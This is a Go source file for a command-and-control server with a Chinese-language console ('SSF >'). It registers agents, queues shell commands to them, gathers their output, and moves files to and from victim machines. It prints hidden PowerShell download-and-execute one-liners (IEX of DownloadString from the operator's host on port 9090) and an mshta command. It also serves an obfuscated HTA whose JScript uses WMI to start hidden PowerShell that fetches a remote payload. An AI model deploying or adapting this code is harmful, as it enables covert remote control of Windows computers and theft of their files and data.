package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strings"
	"time"

	"github.com/AlecAivazis/survey"
	"github.com/fatih/color"
	"github.com/olekukonko/tablewriter"

	"github.com/axgle/mahonia"    //中文编码
	"github.com/c-bata/go-prompt" // 增加tab 下拉菜单
)

const help_shell = `
		help   帮助参数
   		info   列出操作系统参数
        load   加载Moudle下的ps1 文件
        upload 上传文件
		back   返回主页
	 `
const help = `
    	help          帮助参数                   
        set Host      设置IP            
        session list  列出会话列表                     
        Interact      使用session ID 
        shell         进入shell             
	exit          退出                   
	 `

var (
	OS, Arch, IP, hostname, domain, username string //  func info_os()  表格变量
	cmd                                      string = ""
	AGENTS                                   map[string]string
	session_id                               string = ""
	Host                                     string = ""
	back                                     string = ""
	code string =`
<html>
<head>
<script language="JScript">
window.resizeTo(1, 1);
window.moveTo(-2000, -2000);
window.blur();

try
{
window.onfocus = function() { window.blur(); }
window.onerror = function(sMsg, sUrl, sLine) { return false; }
}
catch (e){}

function replaceAll(find, replace, str) 
{
while( str.indexOf(find) > -1)
{
str = str.replace(find, replace);
}
return str;
}
function bas( string )
{
string = replaceAll(']','=',string);
string = replaceAll('[','a',string);
string = replaceAll(',','b',string);
string = replaceAll('@','D',string);
string = replaceAll('-','x',string);
string = replaceAll('~','N',string);
string = replaceAll('*','E',string);
string = replaceAll('%','C',string);
string = replaceAll('$','H',string);
string = replaceAll('!','G',string);
string = replaceAll('{','K',string);
string = replaceAll('}','O',string);
var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
var result     = '';

var i = 0;
do {
var b1 = characters.indexOf( string.charAt(i++) );
var b2 = characters.indexOf( string.charAt(i++) );
var b3 = characters.indexOf( string.charAt(i++) );
var b4 = characters.indexOf( string.charAt(i++) );

var a = ( ( b1 & 0x3F ) << 2 ) | ( ( b2 >> 4 ) & 0x3 );
var b = ( ( b2 & 0xF  ) << 4 ) | ( ( b3 >> 2 ) & 0xF );
var c = ( ( b3 & 0x3  ) << 6 ) | ( b4 & 0x3F );

result += String.fromCharCode(a) + (b?String.fromCharCode(b):'') + (c?String.fromCharCode(c):'');

} while( i < string.length );

return result;
}

var es = '{code}';
eval(bas(es));
</script>
<hta:application caption="no" showInTaskBar="no" windowState="minimize" navigable="no" scroll="no" />
</head>
<body>
</body>
</html>`
	//全局变量
)

func GetRandomString(l int) string {
	str := "0123456789abcdefghijklmnopqrstuvwxyz"
	bytes := []byte(str)
	result := []byte{}
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := 0; i < l; i++ {
		result = append(result, bytes[r.Intn(len(bytes))])
	}
	return string(result)
}

func replace(web_data string) string {
	reg, _ := regexp.Compile(" ")
	data := reg.ReplaceAllString(web_data, "+")
	return data
}
func str_replace(data string,reg_str string,str string) string {
	reg, _ := regexp.Compile(reg_str)
	str_data := reg.ReplaceAllString(data, str)
	return str_data
}

func httpserver(w http.ResponseWriter, r *http.Request) {
	//r.Body = http.MaxBytesReader(w, r.Body, MaxFileSize)
	r.ParseForm()

	//url正则
	url_info, _ := regexp.Compile("/info/*")
	url_md, _ := regexp.Compile("/md/*")
	url_cm, _ := regexp.Compile("/cm/*")
	url_re, _ := regexp.Compile("/re/*")
	url_up, _ := regexp.Compile("/up/*")
	url_img, _ := regexp.Compile("/img/*")
	url_get, _ := regexp.Compile("/get")
	url_hjf, _ := regexp.Compile("/hjf")

	//info
	if url_info.MatchString(r.URL.Path) {
		data := mahonia.NewDecoder("gbk").ConvertString(string(r.Form.Get("data")))
		url_path, _ := regexp.Compile(`[A-Z]+`)
		id := url_path.FindString(r.URL.Path)
		AGENTS[id] = data
		fmt.Println(data)

		//md执行命令
	} else if url_cm.MatchString(r.URL.Path) {
		url_path, _ := regexp.Compile(`[A-Z]+`)
		var id = url_path.FindString(r.URL.Path)
		//fmt.Println(id)
		//两点一判断id是否存在
		//二判断请求id是否是设置的id
		/*
			在进入判断是否是设置的id
		*/
		_, ok := AGENTS[id]
		if ok {
			if id == session_id {
				if cmd != "" {
					fmt.Fprint(w, cmd)
					cmd = ""
					_ = r.Close
				} else {
					fmt.Fprint(w, "")
				}
			} else {
				fmt.Fprint(w, "")
			}
		} else {
			fmt.Fprintf(w, "REGISTER")
		}

		//re接收返回信息
	} else if url_re.MatchString(r.URL.Path) {
		web_data := r.PostFormValue("data")
		decoded, _ := base64.StdEncoding.DecodeString(replace(web_data))
		decodestr := string(decoded)
		fmt.Println(decodestr)

		//load加载ps模块
	} else if url_md.MatchString(r.URL.Path) {
		web_data := r.Form.Get("data")
		file_data, err := ioutil.ReadFile("./Modules/" + web_data)
		if err != nil {
			fmt.Println("Error reading module file", err)
			fmt.Fprintf(w, "")
			return
		} else {
			fmt.Fprintf(w, string(file_data))
		}

		//up客户端下载文件
	} else if url_up.MatchString(r.URL.Path) {
		web_data := r.Form.Get("data")
		file_data, err := ioutil.ReadFile("./file/" + web_data)
		if err != nil {
			fmt.Println("Read file error", err)
			fmt.Fprintf(w, "")
			return
		} else {
			encodeString := base64.StdEncoding.EncodeToString(file_data)
			fmt.Fprintf(w, (encodeString))
		}

		//img上传文件到服务端
	} else if url_img.MatchString(r.URL.Path) {
		web_data := r.Form.Get("data")
		decoded, _ := base64.StdEncoding.DecodeString(replace(web_data))
		//decodestr := string(decoded)

		file, _ := os.Create("./upload/" + GetRandomString(5))
		file.Write(decoded)
		file.Close()
		fmt.Fprintf(w, ("ok upload"))

	} else if url_get.MatchString(r.URL.Path) {
		//get payload get.PS1
		ps1, err := ioutil.ReadFile("./get.ps1")
		payload := strings.Replace(string(ps1), "{ip}", Host, -1)
		if err != nil {
			fmt.Println("Read file error", err)
			fmt.Fprintln(w, "")
			return
		} else {
			fmt.Fprintln(w, payload)
		}
	} else if url_hjf.MatchString(r.URL.Path) {
		js :=  `

var cm="powershell -exec bypass -w 1 -c $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX($V.downloadstring('http://{ip}:{port}/get'));";
var w32ps= GetObject('winmgmts:').Get('Win32_ProcessStartup');
w32ps.SpawnInstance_();
w32ps.ShowWindow=0;
var rtrnCode=GetObject('winmgmts:').Get('Win32_Process').Create(cm,'c:\\',w32ps,null);
`
		js = str_replace(js,`{ip}`,"192.168.1.3",)
		js = str_replace(js,`{port}`,"9090",)
		js = base64.StdEncoding.EncodeToString([]byte(js))
		js = str_replace(js,`\n`,"",)
		reg := map[string]string{
			"]":"=",
			"[":"a",
			",":"b",
			"@":"D",
			"-":"x",
			"~":"N",
			"*":"E",
			"%":"C",
			"$":"H",
			"!":"G",
			"{":"K",
			"}":"O",
		}
		for k,v:=range reg {
			js = str_replace(js,v,k)
		}
		code=strings.Replace(code, `{code}`,js ,1 )
		//fmt.Print(code)
		fmt.Fprint(w, code)
	} else {
		fmt.Fprintf(w, "")
	}
}

//打印全部主机信息
func info_os() {

	for k, v := range AGENTS {
		info := strings.Split(v, "**")
		OS = info[0]
		IP = info[1]
		Arch = info[2]
		hostname = info[3]
		domain = info[4]
		username = info[5]
		//定义 info 信息中的变量
		data := [][]string{
			[]string{k, OS, IP, Arch, hostname, domain, username},
		}
		//将info信息做成表格
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"ID", "操作系统版本", "IP地址", "x86 OR x64", "主机名", "域名", "用户名"})

		for _, v := range data {
			table.Append(v)
		}
		table.Render() // Send output
	}

}

//---------------------------------------------------------------
func Hosts() {

	Blue := color.New(color.FgBlue).SprintFunc() //颜色设定 https://github.com/fatih/color

	prompt := &survey.Input{
		Message: "set ip",
	}

	survey.AskOne(prompt, &Host, survey.WithIcons(func(icons *survey.IconSet) {

		icons.Question.Text = "メ "
		icons.Question.Format = "red+hb"

	}))
	fmt.Printf("%s setting listener => %s:9090 \n", Blue("[*]"), Host) //https://github.com/fatih/color
	fmt.Println("\n")
	payload := "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('http://" + Host + ":9090/get');IEX($s)"

	strbytes := []byte(payload)
	encoded := base64.StdEncoding.EncodeToString(strbytes)
	// fmt.Println(encoded)
	command := "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + encoded + "')))}"
	fmt.Printf("%s %s \n", Blue("[☠ ]"), command)
	fmt.Println("\n")

	command = "Start-Process powershell -ArgumentList " + "\"iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + encoded + "')))\"" + " -WindowStyle Hidden"
	fmt.Printf("%s %s \n", Blue("[☠ ]"), command)
	fmt.Println("\n")

	command = "mshta "+Host+":9090/hjf"
	fmt.Printf("%s %s \n", Blue("[☠ ]"), command)
	fmt.Println("\n")


	////---------------------------------------------------------------
	//payload := "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('http://" + Host + ":9090/get');IEX($s)"
	//
	//strbytes := []byte(payload)
	//encoded := base64.StdEncoding.EncodeToString(strbytes)
	////---------------------------------------------------------------
	//commandJ := "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + encoded + "')))}"
	////commandF = commandJ
	//fmt.Printf("%s %s \n", Blue("[*]"), "---+Powershell JOB Payload+---")
	//fmt.Printf("%s %s \n", Blue("[☠ ]"), commandJ)
	//fmt.Println("\n")
	////---------------------------------------------------------------
	//commandP := "Start-Process powershell -ArgumentList " + "\"iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + encoded + "')))\"" + " -WindowStyle Hidden"
	//fmt.Printf("%s %s \n", Blue("[*]"), "---+Powershell New Process Payload+---")
	//fmt.Printf("%s %s \n", Blue("[☠ ]"), commandP)
	//fmt.Println("\n")
	////---------------------------------------------------------------
	//commandF_IP := "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('http://" + Host + ":9090/hjf');IEX($s)"
	//commandF_strbytes := []byte(commandF_IP)
	//commandF_encoded := base64.StdEncoding.EncodeToString(commandF_strbytes)
	//commandF := "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + commandF_encoded + "')))"
	//fmt.Printf("%s %s \n", Blue("[*]"), "---+Powershell JOB + File Payload+---")
	//fmt.Printf("%s %s \n", Blue("[☠ ]"), commandF)
	//fmt.Println("\n")
	////---------------------------------------------------------------
	//simple_payload := "powershell -w hidden \"$h = (New-Object Net.WebClient).DownloadString('http://" + Host + ":9090/get');Invoke-Expression $h;\""
	//
	//simple_payload2 := "powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('http://" + Host + ":9090/get');\""
	//simple_payload3 := "powershell -w hidden \"Invoke-Expression(New-Object Net.WebClient).DownloadString('http://" + Host + ":9090/get');\""
	//fmt.Printf("%s %s \n", Blue("[*]"), "---+ Powershell simple payloads +---")
	//fmt.Printf("%s %s \n", Blue("[☠ ]"), simple_payload)
	//fmt.Println("\n")
	//fmt.Printf("%s %s \n", Blue("[☠ ]"), simple_payload2)
	//fmt.Println("\n")
	//fmt.Printf("%s %s \n", Blue("[☠ ]"), simple_payload3)
	//fmt.Println("\n")
}

//---------------------------------------------------------------

func Scanf(a *string) {
	reader := bufio.NewReader(os.Stdin)
	data, _, _ := reader.ReadLine()
	if string(data) == "info" {
		*a = ""
		info_os() // info信息
		return
	} else if string(data) == "help" {
		*a = ""

		fmt.Println(help_shell)
		return
		//帮助参数
	} else if string(data) == "back" {
		*a = ""
		back = "back"
		return
	}
	*a = string(data)

}

func clear() {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("cmd", "/c", "cls")
		cmd.Stdout = os.Stdout
		cmd.Run()
		cmd.Start()
	} else {
		cmd := exec.Command("clear")
		cmd.Stdout = os.Stdout
		cmd.Run()
		cmd.Start()
	}
	//定义系统清屏clear()
}

func completer(in prompt.Document) []prompt.Suggest { //一级菜单栏列表
	s := []prompt.Suggest{
		{Text: "help"},
		{Text: "set Host"},
		{Text: "session list"},
		{Text: "Interact", Description: "Interact with AGENT"},
		{Text: "shell"},
		{Text: "exit"},
	}
	return prompt.FilterHasPrefix(s, in.GetWordBeforeCursor(), true)
}

func Session_id(id string) {
	Blue := color.New(color.FgBlue).SprintFunc()
	Red := color.New(color.FgRed).SprintFunc()
	if len(strings.Split(id, " ")) > 1 {
		session_id = strings.Split(id, " ")[1]
		fmt.Printf("%s setting Session id=> %s.\n", Blue("[*]"), session_id)
	} else {
		fmt.Printf("%s set Session id err \n", Red("[*]"))
	}

}

func Options() { //定义tab 下拉菜单选项参数
	for true {
		options := prompt.Input("SSF >", completer,
			prompt.OptionPrefixTextColor(prompt.Red),                 //字体颜色
			prompt.OptionPreviewSuggestionTextColor(prompt.Black),    //下拉菜单的字体
			prompt.OptionSelectedSuggestionBGColor(prompt.LightGray), //下拉菜单的字背景
			prompt.OptionSuggestionBGColor(prompt.DarkGray))          //菜单框背景

		if options == "shell" {
			for true {
				fmt.Print("Console_shell >")
				Scanf(&cmd)
				if back == "back" {
					back = ""
					break
				}

			}
		} else if options == "help" {
			fmt.Println(help)
		} else if strings.Contains(options, "Interact") {
			Session_id(options)
		} else if options == "session list" {
			info_os()
		} else if options == "exit" {
			os.Exit(0)
			break
		} else if options == "set Host" {
			Hosts()
		}

	}

}

func main() {
	AGENTS = make(map[string]string)
	http.HandleFunc("/", httpserver) //设置访问的路由

	go http.ListenAndServe(":9090", nil) //设置监听的端口
	clear()                              //系统清屏
	Options()

}
